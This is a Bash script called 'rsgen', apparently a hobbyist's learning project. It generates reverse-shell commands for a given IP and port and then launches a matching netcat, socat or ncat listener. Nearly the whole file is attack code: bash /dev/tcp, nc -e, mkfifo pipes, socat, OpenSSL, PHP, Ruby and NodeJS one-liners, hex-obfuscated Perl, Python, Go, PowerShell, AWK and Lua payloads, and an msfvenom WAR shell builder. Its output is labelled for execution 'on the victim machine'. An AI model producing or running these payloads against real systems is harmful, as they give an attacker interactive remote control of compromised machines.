#!/bin/bash

#################################################################################
## Created by: ThatDarnNoob, thanks to PayloadAllTheThings										 ##
## Motivation: Learn something of Bash :D																			 ##	
## There are some unnecessary features but i added them anyways to learn !		 ##
## I have to add more reverse shells																					 ##
#################################################################################

# DEBUG:
#set -x

USERNAME=$(logname)
LOGFILE="/tmp/history.log"
NOLISTENER=false
# Colors:

CYAN='\033[1;36m'
RED='\033[1;31m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
GREEN='\033[1;32m'
YELOW='\033[1;33m'
ORANGE='\033[0;33m'
GRAY='\033[0;37m'

NOCOLOR='\033[0m' # No Color

function NewExec() {
	echo "====================================================================================" >> $LOGFILE
}

function Trap() {
	echo -e "\n${GREEN}[!]${CYAN} [$(date | cut -d" " -f5)] ${RED}Finished by user: ${BLUE}$USERNAME" | tee -a $LOGFILE
}

function checkIP() {
	if [[ "$1" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]]; then
		IP=$1
		return 0
	else 
		FAIL=$1
		return 1
	fi
}

function GrepIP() {
	GrepedIP=$(ifconfig $1 2>/dev/null | grep 'netmask' | cut -d":" -f2 | awk '{print $2}')
	if checkIP $GrepedIP
		then
		return 0
	else
		return 1
	fi
}

function CheckPort() {
	nc -z -n -w1 127.0.0.1 $1 > /dev/null
  if [[ "$?" == "0" ]]
    then
      return 1
  else
  		return 0
  fi
}

helpme () {
	echo -e "\n${GREEN}[+] Usage: rsgen -i [interface] -p [port] [-axblrgnjwPNOALRG, --ps] \n\n[+] OPTIONS:\n"
	echo "	-i --interface : Interface to grep the IP"
  echo "	-I --lhost : Local IP"
  echo -e "	-p --lport : Listen Port"
	echo -e "	-Q --no-listener : Do not launch a listener\n"
	echo -e "[+] SHELLS:\n"
	echo "	-a --all : Diplay all reverse shell except OpenSSL"
  echo "	-x --php : PHP reverse shell"
	echo "	-P --python : python reverse shell"	
	echo "	--ps --powershell : Powershell reverse shell"
	echo " 	-b --bash --sh : bash or sh reverse shell"
	echo "   		--tcp : TCP reverse shell"
 	echo "   		--udp : UDP reverse shell"
	echo "	-S --socat : Socat reverse shell"
	echo "	-l --perl : Perl reverse shell  (-l for larry Wall)"
	echo "	-r --ruby : Ruby reverse shell"
	echo "	-g --go : Golang: Reverse shell"
	echo "	-n --nc : Netcat reverse shell"
	echo "	-N --nc-bsd : Netcat open BSD reverse shell"
	echo "	-C --ncat : Ncat reverse  shell"
	echo "	-O --open-ssl : Creates a self signed certificate and lauch a nc listener, OpenSSL reverse shell"
	echo "	-A --awk : AWK reverse shell"
	echo "	-j --java : Java reverse shell"
	echo "	-w --war : WAR reverse shell"
	echo "	-L --lua : Lua reverse shell"
	echo "	-R --node : NodeJS reverse shell"
	echo -e "	-G --groovy : Groovy reverse shell\n"
	echo "[+] Examples:"
	echo "	rsgen -i tun0 -p 9090 -ps (Powershell)"
	echo "	rsgen -i eth0 -p 443 -b --tcp (Bash TCP)"
	echo "	rsgen -I 192.168.1.2 -x -p 4444 -Q (Php and Dont launch a nc listener)"
	echo -e "	rsgen -I 10.10.14.128 -p 5656 -S (Socat) ${NOCOLOR}"
#	echo -ne "${NOCOLOR}"
}

function error() {
	echo -e "${GREEN}[!] ${RED}Something went wrong, not enough arguments.\n${GREEN}[*] ${RED}Help: rsgen -h or --help" | tee -a $LOGFILE
}

function quit() {
	echo -e "${GREEN}[!] ${RED}Quitting..." | tee -a $LOGFILE
}

function cmd_ban() {
	echo -e "${GREEN}[+] ${BLUE}Exec on the victim machine:${NOCOLOR}" | tee -a $LOGFILE
}

function tcp_bash() {
	cmd_ban
	TCP_BASH=$(echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1" | tee -a $LOGFILE)
	echo "$TCP_BASH"
	
}

function udp_bash() {
  cmd_ban
	UDP_BASH=$(echo "sh -i >& /dev/udp/$IP/$PORT 0>&1" | tee -a $LOGFILE)
	echo $UDP_BASH
}

function socat_rs() {
  cmd_ban
	SOCAT=$(echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:$PORT" | tee -a $LOGFILE)
	echo $SOCAT

}

function perl_rs() {
  cmd_ban
#  printf "perl -e 'use Socket\;\$i="$IP"\;\$p=$PORT\;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))\;if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S")\;open(STDOUT,">&S")\;open(STDERR,">&S");exec("/bin/sh -i");};'"
	PERL=$(echo -ne $'\x70\x65\x72\x6c\x20\x2d\x4d\x49\x4f\x3a\x3a\x53\x6f\x63\x6b\x65\x74\x20\x2d\x65\x20\x27\x24\x70\x3d\x66\x6f\x72\x6b\x3b\x65\x78\x69\x74\x2c\x69\x66\x28\x24\x70\x29\x3b\x24\x63\x3d\x6e\x65\x77\x20\x49\x4f\x3a\x3a\x53\x6f\x63\x6b\x65\x74\x3a\x3a\x49\x4e\x45\x54\x28\x50\x65\x65\x72\x41\x64\x64\x72\x20\x3d\x3e\x20\x22';echo -n "$IP:$PORT";echo $'\x22\x29\x3b\x53\x54\x44\x49\x4e\x2d\x3e\x66\x64\x6f\x70\x65\x6e\x28\x24\x63\x2c\x72\x29\x3b\x24\x7e\x2d\x3e\x66\x64\x6f\x70\x65\x6e\x28\x24\x63\x2c\x77\x29\x3b\x73\x79\x73\x74\x65\x6d\x24\x5f\x20\x77\x68\x69\x6c\x65\x3c\x3e\x3b\x27')
	echo $PERL | tee -a $LOGFILE

}

function python_rs() {
	cmd_ban
	PYTHON=$(echo -ne $'\x70\x79\x74\x68\x6f\x6e\x20\x2d\x63\x20\x27\x69\x6d\x70\x6f\x72\x74\x20\x73\x6f\x63\x6b\x65\x74\x2c\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2c\x6f\x73\x3b\x73\x3d\x73\x6f\x63\x6b\x65\x74\x2e\x73\x6f\x63\x6b\x65\x74\x28\x73\x6f\x63\x6b\x65\x74\x2e\x41\x46\x5f\x49\x4e\x45\x54\x2c\x73\x6f\x63\x6b\x65\x74\x2e\x53\x4f\x43\x4b\x5f\x53\x54\x52\x45\x41\x4d\x29\x3b\x73\x2e\x63\x6f\x6e\x6e\x65\x63\x74\x28\x28';echo -n "\"$IP\",$PORT";echo $'\x29\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x30\x29\x3b\x20\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x31\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x32\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x70\x74\x79\x3b\x20\x70\x74\x79\x2e\x73\x70\x61\x77\x6e\x28\x22\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x22\x29\x27')

	echo $PYTHON | tee -a $LOGFILE

}

function php_rs() {
	cmd_ban
	PHP_RS=$(echo "php -r '\$sock=fsockopen(\"$IP\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" | tee -a $LOGFILE)
	echo $PHP_RS

}

function ruby_rs() {
	cmd_ban #; echo -ne "${GREEN}[-] ${RED}(You can't spawn a TTY)"
#	RUBY=$(echo "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
	RUBY=$(echo "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$IP\",\"$PORT\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'" | tee -a $LOGFILE) # Doesn't depends on /bin/sh or bash, you cant spawn a tty session
	echo $RUBY | tee -a $LOGFILE

}

function go_rs() {
	cmd_ban
	GO=$(echo -ne $'\x65\x63\x68\x6f\x20\x27\x70\x61\x63\x6b\x61\x67\x65\x20\x6d\x61\x69\x6e\x3b\x69\x6d\x70\x6f\x72\x74\x22\x6f\x73\x2f\x65\x78\x65\x63\x22\x3b\x69\x6d\x70\x6f\x72\x74\x22\x6e\x65\x74\x22\x3b\x66\x75\x6e\x63\x20\x6d\x61\x69\x6e\x28\x29\x7b\x63\x2c\x5f\x3a\x3d\x6e\x65\x74\x2e\x44\x69\x61\x6c\x28\x22\x74\x63\x70\x22\x2c\x22'; echo -n "$IP:$PORT"; echo $'\x22\x29\x3b\x63\x6d\x64\x3a\x3d\x65\x78\x65\x63\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x28\x22\x2f\x62\x69\x6e\x2f\x73\x68\x22\x29\x3b\x63\x6d\x64\x2e\x53\x74\x64\x69\x6e\x3d\x63\x3b\x63\x6d\x64\x2e\x53\x74\x64\x6f\x75\x74\x3d\x63\x3b\x63\x6d\x64\x2e\x53\x74\x64\x65\x72\x72\x3d\x63\x3b\x63\x6d\x64\x2e\x52\x75\x6e\x28\x29\x7d\x27\x20\x3e\x20\x2f\x74\x6d\x70\x2f\x74\x2e\x67\x6f\x20\x26\x26\x20\x67\x6f\x20\x72\x75\x6e\x20\x2f\x74\x6d\x70\x2f\x74\x2e\x67\x6f\x20\x26\x26\x20\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x74\x2e\x67\x6f')
	echo $GO | tee -a $LOGFILE

}

function nc_rs() {
	cmd_ban
	NC=$(echo "nc -e /bin/sh $IP $PORT")
	echo $NC | tee -a $LOGFILE

}

function nc_bsd() {
	cmd_ban
	NC_BSD=$(echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f")
	echo $NC_BSD | tee -a $LOGFILE

}

function ncat_rs() {
	cmd_ban
	NCAT=$(echo "ncat $IP $PORT -e /bin/bash")
	echo $NCAT

}

function OpenSSL() {
	cmd_ban
	OPENSSL=$(echo "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $IP:$PORT > /tmp/s; rm /tmp/s")
	echo "$OPENSSL"

}

function powershell_rs() {
	cmd_ban
	POWERSHELL=$(echo -ne $'\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x20\x2d\x4e\x6f\x50\x20\x2d\x4e\x6f\x6e\x49\x20\x2d\x57\x20\x48\x69\x64\x64\x65\x6e\x20\x2d\x45\x78\x65\x63\x20\x42\x79\x70\x61\x73\x73\x20\x2d\x43\x6f\x6d\x6d\x61\x6e\x64\x20\x4e\x65\x77\x2d\x4f\x62\x6a\x65\x63\x74\x20\x53\x79\x73\x74\x65\x6d\x2e\x4e\x65\x74\x2e\x53\x6f\x63\x6b\x65\x74\x73\x2e\x54\x43\x50\x43\x6c\x69\x65\x6e\x74\x28'; echo -n "\"$IP\",$PORT";echo $'\x29\x3b\x24\x73\x74\x72\x65\x61\x6d\x20\x3d\x20\x24\x63\x6c\x69\x65\x6e\x74\x2e\x47\x65\x74\x53\x74\x72\x65\x61\x6d\x28\x29\x3b\x5b\x62\x79\x74\x65\x5b\x5d\x5d\x24\x62\x79\x74\x65\x73\x20\x3d\x20\x30\x2e\x2e\x36\x35\x35\x33\x35\x7c\x25\x7b\x30\x7d\x3b\x77\x68\x69\x6c\x65\x28\x28\x24\x69\x20\x3d\x20\x24\x73\x74\x72\x65\x61\x6d\x2e\x52\x65\x61\x64\x28\x24\x62\x79\x74\x65\x73\x2c\x20\x30\x2c\x20\x24\x62\x79\x74\x65\x73\x2e\x4c\x65\x6e\x67\x74\x68\x29\x29\x20\x2d\x6e\x65\x20\x30\x29\x7b\x3b\x24\x64\x61\x74\x61\x20\x3d\x20\x28\x4e\x65\x77\x2d\x4f\x62\x6a\x65\x63\x74\x20\x2d\x54\x79\x70\x65\x4e\x61\x6d\x65\x20\x53\x79\x73\x74\x65\x6d\x2e\x54\x65\x78\x74\x2e\x41\x53\x43\x49\x49\x45\x6e\x63\x6f\x64\x69\x6e\x67\x29\x2e\x47\x65\x74\x53\x74\x72\x69\x6e\x67\x28\x24\x62\x79\x74\x65\x73\x2c\x30\x2c\x20\x24\x69\x29\x3b\x24\x73\x65\x6e\x64\x62\x61\x63\x6b\x20\x3d\x20\x28\x69\x65\x78\x20\x24\x64\x61\x74\x61\x20\x32\x3e\x26\x31\x20\x7c\x20\x4f\x75\x74\x2d\x53\x74\x72\x69\x6e\x67\x20\x29\x3b\x24\x73\x65\x6e\x64\x62\x61\x63\x6b\x32\x20\x20\x3d\x20\x24\x73\x65\x6e\x64\x62\x61\x63\x6b\x20\x2b\x20\x22\x50\x53\x20\x22\x20\x2b\x20\x28\x70\x77\x64\x29\x2e\x50\x61\x74\x68\x20\x2b\x20\x22\x3e\x20\x22\x3b\x24\x73\x65\x6e\x64\x62\x79\x74\x65\x20\x3d\x20\x28\x5b\x74\x65\x78\x74\x2e\x65\x6e\x63\x6f\x64\x69\x6e\x67\x5d\x3a\x3a\x41\x53\x43\x49\x49\x29\x2e\x47\x65\x74\x42\x79\x74\x65\x73\x28\x24\x73\x65\x6e\x64\x62\x61\x63\x6b\x32\x29\x3b\x24\x73\x74\x72\x65\x61\x6d\x2e\x57\x72\x69\x74\x65\x28\x24\x73\x65\x6e\x64\x62\x79\x74\x65\x2c\x30\x2c\x24\x73\x65\x6e\x64\x62\x79\x74\x65\x2e\x4c\x65\x6e\x67\x74\x68\x29\x3b\x24\x73\x74\x72\x65\x61\x6d\x2e\x46\x6c\x75\x73\x68\x28\x29\x7d\x3b\x24\x63\x6c\x69\x65\x6e\x74\x2e\x43\x6c\x6f\x73\x65\x28\x29')
	echo "$POWERSHELL"

}

function AWK_rs() {
	cmd_ban
	AWK=$(echo -ne $'\x61\x77\x6b\x20\x27\x42\x45\x47\x49\x4e\x20\x7b\x73\x20\x3d\x20\x22\x2f\x69\x6e\x65\x74\x2f\x74\x63\x70\x2f\x30\x2f'; echo -n "$IP/$PORT"; echo $'\x22\x3b\x20\x77\x68\x69\x6c\x65\x28\x34\x32\x29\x20\x7b\x20\x64\x6f\x7b\x20\x70\x72\x69\x6e\x74\x66\x20\x22\x73\x68\x65\x6c\x6c\x3e\x22\x20\x7c\x26\x20\x73\x3b\x20\x73\x20\x7c\x26\x20\x67\x65\x74\x6c\x69\x6e\x65\x20\x63\x3b\x20\x69\x66\x28\x63\x29\x7b\x20\x77\x68\x69\x6c\x65\x20\x28\x28\x63\x20\x7c\x26\x20\x67\x65\x74\x6c\x69\x6e\x65\x29\x20\x3e\x20\x30\x29\x20\x70\x72\x69\x6e\x74\x20\x24\x30\x20\x7c\x26\x20\x73\x3b\x20\x63\x6c\x6f\x73\x65\x28\x63\x29\x3b\x20\x7d\x20\x7d\x20\x77\x68\x69\x6c\x65\x28\x63\x20\x21\x3d\x20\x22\x65\x78\x69\x74\x22\x29\x20\x63\x6c\x6f\x73\x65\x28\x73\x29\x3b\x20\x7d\x7d\x27\x20\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c')
	echo $AWK

}

# function java_rs() {
#	 cmd_ban
#		
#
# }

function WarRS() {
	cmd_ban
	warfile="/tmp/payload$RANDOM.war"
	echo -e "${GREEN}[+] ${BLUE}Generating msfvenom payload" | tee -a $LOGFILE
	echo -e "${GREEN}[+] ${BLUE}Command: msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PORT -f war > $warfile"
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PORT -f war > $warfile
	echo -ne "${GREEN}[+] ${BLUE}Copy $warfile to the current directory [y/n] > "
	read response
	case "$response" in
    [yY][eE][sS]|[yY]|[oO][kK]) 
        echo -e "${GREEN}[+] ${BLUE}Copying $warfile..." | tee -a $LOGFILE
				cp $warfile .
        ;;
    *)
        echo -e "${GREEN}[-] ${RED}Omitted"
        ;;
	esac
	echo -e "${GREEN}[+] ${BLUE}Filename: "
	strings $warfile | grep jsp # in order to get the name of the file
	echo -e "${GREEN}[+] ${BLUE}Done"

}

function lua_rs() {
	cmd_ban
#	LUA=$(echo lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');")
	LUA=$(echo -ne $'\x6c\x75\x61\x20\x2d\x65\x20\x22\x72\x65\x71\x75\x69\x72\x65\x28\x27\x73\x6f\x63\x6b\x65\x74\x27\x29\x3b\x72\x65\x71\x75\x69\x72\x65\x28\x27\x6f\x73\x27\x29\x3b\x74\x3d\x73\x6f\x63\x6b\x65\x74\x2e\x74\x63\x70\x28\x29\x3b\x74\x3a\x63\x6f\x6e\x6e\x65\x63\x74\x28\x27'; echo -n "$IP','$PORT'"; echo $'\x29\x3b\x6f\x73\x2e\x65\x78\x65\x63\x75\x74\x65\x28\x27\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x20\x3c\x26\x33\x20\x3e\x26\x33\x20\x32\x3e\x26\x33\x27\x29\x3b\x22')
	echo $LUA | tee -a $LOGFILE
	
}

function node_rs() {
	cmd_ban
	NODEJS=$(echo "require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')")
	echo $NODEJS | tee -a $LOGFILE

}

#function groovy_rs() {
#	cmd_ban
#	GROOVY=$(echo )

#}

function All() {
	echo -e "${GREEN}[+]${BLUE}BASH:	\n ${NOCOLOR} $(tcp_bash | grep $IP)\n"
	echo -e "${GREEN}[+]${BLUE}PERL: 	\n ${NOCOLOR} $(perl_rs | grep $IP)\n"
	echo -e "${GREEN}[+]${BLUE}PYTHON:	\n ${NOCOLOR} $(python_rs | grep $IP)\n"
	echo -e "${GREEN}[+]${BLUE}PHP:	\n ${NOCOLOR} $(php_rs | grep $IP)\n"
	echo -e "${GREEN}[+]${BLUE}RUBY:\n ${NOCOLOR} $(ruby_rs | grep $IP)\n"
	echo -e "${GREEN}[+]${BLUE}GO:		\n ${NOCOLOR} $(go_rs | grep $IP)\n"
	echo -e "${GREEN}[+]${BLUE}NC: 		\n ${NOCOLOR} $(nc_rs | grep $IP)\n"
	echo -e "${GREEN}[+]${BLUE}NC BSD:	\n ${NOCOLOR} $(ncbsd | grep $IP)\n"
	echo -e "${GREEN}[+]${BLUE}NCAT:	\n ${NOCOLOR} $(ncat_rs | grep $IP)\n"
	echo -e "${GREEN}[+]${BLUE}POWERSHELL:	\n ${NOCOLOR} $(powershell_rs | grep $IP)\n"
	echo -e "${GREEN}[+]${BLUE}AWK:		\n ${NOCOLOR} $(AWK_rs | grep $IP)\n"
	echo -e "${GREEN}[+]${BLUE}LUA:		\n ${NOCOLOR} $(lua_rs | grep $IP )\n"
	echo -e "${GREEN}[+]${BLUE}NODEJS:	\n ${NOCOLOR} $(node_rs | grep $IP)\n"

}

# Some extra stuff

NewExec
echo "[+] [$(date | cut -d" " -f5)] Starting..." >> $LOGFILE
trap 'Trap; NewExec; exit 1' 1 2 15

# Check if $1 is defined

if [ -z $1 ]; then
	error
	#quit
	Trap
	exit
fi

# Check if nc is installed

command -v nc >/dev/null 2>&1 || { echo >&2 -e "${GREEN}[-] ${RED}I require nc but it's not installed.  no listener = true"; }

# Global variables, reverse shell type, IP, port and nc listener

while test $# -gt 0; do
	case $1 in
#			-G|--groovy)
#				SHELL="TCP_SHELL"
#				REVERSESHELL=groovy_rs
#				shift
#				;;
			-a|--all)
				SHELL="TCP_SHELL"
				REVERSESHELL=All
				shift
				;;
			-R|--node)
				SHELL="TCP_SHELL"
				REVERSESHELL=node_rs
				shift
				;;
			-L|--lua)
				SHELL="TCP_SHELL"
				REVERSESHELL=lua_rs
				shift
				;;
			-w|--war)
				SHELL="TCP_SHELL"
				REVERSESHELL=WarRS
				command -v msfvenom >/dev/null 2>&1 || { echo >&2 "[-] I require msfvenom but it's not installed.  no listener = true"; }
				shift
				;;
			-A|--awk)
				SHELL="TCP_SHELL"
				REVERSESHELL=AWK_rs
				shift
				;;
			-ps|--powershell)
				SHELL="TCP_SHELL"
				REVERSESHELL=powershell_rs
				shift
				;;
			-O|--openssl)
				command -v ncat >/dev/null 2>&1 || { NOLISTENER=true; echo >&2 "[-] I require ncat but it's not installed.  No Listener = true"; }
				SHELL="OPENSSL"
				REVERSESHELL=OpenSSL
				shift
				;;
			-C|--ncat)
#				command -v ncat >/dev/null 2>&1 || { echo >&2 "I require ncat but it's not installed.  Aborting."; exit 1; }
				SHELL="TCP_SHELL"
				REVERSESHELL=ncat_rs
				shift
				;;
			-N|--nc-bsd)
				SHELL="TCP_SHELL"
				REVERSESHELL=nc_bsd
				shift
				;;
			-n|--nc)
				SHELL="TCP_SHELL"
				REVERSESHELL=nc_rs
				shift
				;;
			-g|--go)
				SHELL="TCP_SHELL"
				REVERSESHELL=go_rs
				shift
				;;
			-r|--ruby)
				SHELL="TCP_SHELL"
				REVERSESHELL=ruby_rs
				shift
				;;
			-x|--php)
				SHELL="TCP_SHELL"
				REVERSESHELL=php_rs
				shift
				;;
			-b|--bash|--sh)
				shift
				case $1 in
					--udp)
						SHELL="UDP_SHELL"
						REVERSESHELL=udp_bash
						shift
						;;
					--tcp)
						SHELL="TCP_SHELL"
						REVERSESHELL=tcp_bash
						shift
						;;
					*)
						echo "[!] Not valid: $1"
						Trap
						exit 1
						;;
				esac
			;;
		-S|--socat)
			command -v socat >/dev/null 2>&1 || { echo -e >&2 "${GREEN}[-] ${RED}I require socat but it's not installed.  Aborting."; }
			SHELL="SOCAT"
			REVERSESHELL=socat_rs
			shift
			;;
		-h|--help)
			helpme
			Trap
			exit 0
			;;
		-i|--interface)
			shift 
			int=$1
			if GrepIP $int; then
				echo -e "${GREEN}[+] ${BLUE}Grabbed IP: $IP"
			else 
				echo -e "${GREEN}[-] ${RED}Interface not found or no IP address"
				quit
				Trap
				exit 1
			fi
			shift
			;;
		-I|--lhost)
			shift
			CHKIP=$1
			if checkIP $CHKIP; then
				echo -e "${GREEN}[+] ${BLUE}IP: $IP"
			else
				echo -e "${GREEN}[-] ${RED}Bad IP Address $FAIL"
				quit
				Trap
				exit 1
			fi
			shift
			;;
		-p|--lport)
			shift
			PORT=$1
			if test $PORT -lt 65536 && CheckPort $PORT; then
				echo -e "${GREEN}[+] ${BLUE}Port: $PORT"
				PORT=$PORT
			else
				echo "${GREEN}[-] ${RED}Invalid Port or already in use: $PORT"
				quit
				exit 1
			fi
			shift
			;;
		-l|--perl)
			SHELL="TCP_SHELL"
			REVERSESHELL=perl_rs
			shift
			;;
		-P|--python)
			SHELL="TCP_SHELL"
			REVERSESHELL=python_rs
			shift
			;;
		-Q|--no-listener)
			NOLISTENER=true
		#	echo $NOLISTENER
			shift
			;;
		*) # end
			quit
			break
			;;
	esac				
done

# Generate the evil command

$REVERSESHELL | tee -a $LOGFILE #$IP $PORT

echo -e "${GREEN}[+] ${BLUE}H${ORANGE}a${GRAY}p${YELLOW}p${GREN}y ${RED}H${CYAN}a${NOCOLOR}c${PURPLE}k${BLUE}i${YELLOW}n${ORANGE}g${GRAY}!${RED} :)${NOCOLOR}"

# Check the kind of listener

function LISTENINGMODE() {
	if $NOLISTENER; then
		return 0
	else
		return 1
	fi

}

function chk_shell() {
	if [ $SHELL = "TCP_SHELL" ] && ! LISTENINGMODE; then
		echo -e "${GREEN}[+] ${BLUE}Launching tcp nc listener:${NOCOLOR}"
		nc -lvnp $PORT
	elif [ $SHELL = "UDP_SHELL" ] && ! LISTENINGMODE; then
		echo -e "${GREEN}[+] ${BLUE}Launching udp nc listener:${NOCOLOR}"
		nc -u -lvp $PORT
	elif [ $SHELL = "SOCAT" ] && ! LISTENINGMODE; then
		echo -e "${GREEN}[+] ${BLUE}Launching Socat server...${NOCOLOR}"
		socat file:`tty`,raw,echo=0 TCP-L:$PORT
	elif [ $SHELL = "OPENSSL" ] && ! LISTENINGMODE; then
		echo -e "${GREEN}[+] ${BLUE}Launching ncat over SSL...${NOCOLOR}"
		ncat --ssl -vv -l -p $PORT
		exit 0
	else 
			echo -e "${GREEN}[+] ${BLUE}No Listener${NOCOLOR}"
			exit 0
	fi
}
LISTENINGMODE
chk_shell;Trap;NewExec
exit 0

echo ${NOCOLOR}
